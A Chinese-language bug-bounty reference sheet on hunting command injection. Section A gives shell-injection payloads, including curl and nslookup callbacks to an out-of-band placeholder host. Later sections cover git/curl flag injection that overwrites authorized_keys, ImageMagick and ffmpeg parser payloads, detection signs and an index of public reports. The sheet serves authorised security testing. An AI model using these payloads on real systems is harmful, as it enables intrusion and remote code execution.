# hunt-command-injection · 参考

按 recon 落点类型定向查阅。真实报告源自本仓库第二轮高价值案例（value_score≥8）。`<OAST>` 换成你的带外域名。

## Payloads（分族）

### A. 直接 OS 命令注入（输入进 shell）
先用**无害时序/带外**判活，别一上来打 `id` 破坏语境：
```
;sleep 8;            | | ping -c 8 127.0.0.1    # 时序盲注
$(sleep 8)  `sleep 8`                            # 子命令
;nslookup <OAST>;    | curl http://<OAST>/hit    # 带外确认
%0a id %0a           （换行注入）                 # 只读回显
| id                 & whoami                     # 分隔符
```
判活后再取只读回显（`id`/`uname -a`）。Windows：`& whoami`、`| dir`。

### B. 参数 / 标志注入（argument / flag injection）★高价值
输入没进 shell，但**作为参数拼进已有命令**，用 `-`/`--` 开头的输入改变程序行为——常见于 git/tar/curl/rsync/zip。
- **git archive/checkout 注入 `--output=`** 覆盖任意文件（如 `~/.ssh/authorized_keys`）→ SSH 登录 → RCE：#587854、#658013。
- Airflow 连接参数 `sql_proxy_binary_path` 直接当命令执行：#1895316。
- curl/wget 输入以 `-` 开头被当选项：`-o/tmp/x`、`--config`。
- 防御视角触发点：任何"用户可控字符串被原样放进 argv 列表且以 `-` 开头未被 `--` 终止"。

### C. 外部程序 delegate / 解析器注入 ★上传处必试
上传"图片/视频"实为解析器命令注入：
- **ImageMagick**：MVG `fill 'url(https://x"|command)'`、SVG `<image xlink:href="...|command">`、ImageTragick（#135072、#412021）。
- **ffmpeg**：`m3u8`/HLS 播放列表指向 `file://`/内部（→ 也见 hunt-ssrf）。
- 上传时用真实 magic bytes 伪装，扩展名与内容不一致绕过校验。

### D. 版本控制 / 包管理 hook 与子模块
- Mercurial/git 子仓库 clone 触发 `post-update`/`post-checkout` hook 执行命令：#294147。
- git flag injection 见 B。

### E. 语言层 → 命令
- 原型污染污染 `sourceURL`/spawn 参数间接 RCE（#861744，→ 也见 hunt-prototype-pollution）。
- SQLi 堆叠查询 `xp_cmdshell`（#1104111，→ 也见 hunt-sqli）。

## Detection Patterns（怎么判，而非猜）

- **带外命中（最硬）**：OAST 收到 DNS/HTTP 回连 = 命令执行了。优先 DNS（出站限制少）。
- **时序**：注入 `sleep 8`/`ping -c 8` 后响应稳定慢 8s，基线快 → 盲命令执行。多次取中位排抖动。
- **回显**：响应里出现 `uid=`/`gid=`（`id` 输出）或目录列表 = 直接回显。
- **文件副作用（参数注入）**：目标文件被覆盖/新建（授权内验证），如写入可读标记文件。
- **delegate 报错**：ImageMagick 报 `delegate`/`https` 相关错误 = 解析器在尝试外呼。

## Real Reports（复现索引）

| 族 | 报告 | 要点 |
|---|---|---|
| 参数注入 | 587854 / 658013 | git archive `--output` 覆盖 authorized_keys→RCE |
| 参数→命令 | 1895316 | Airflow sql_proxy_binary_path 当命令 |
| delegate | 135072 / 412021 | ImageMagick MVG/SVG/ImageTragick |
| hook | 294147 | Mercurial/git 子仓库 post-update hook |
| 原型污染→RCE | 861744 | 污染 sourceURL |
| SQLi→命令 | 1104111 | xp_cmdshell 堆叠 |

hunt 顺序：先 A 时序/带外判活最安全；上传入口直接 C；CI/git/ref 入口重点 B（参数注入常被忽略且直达文件覆盖 RCE）。
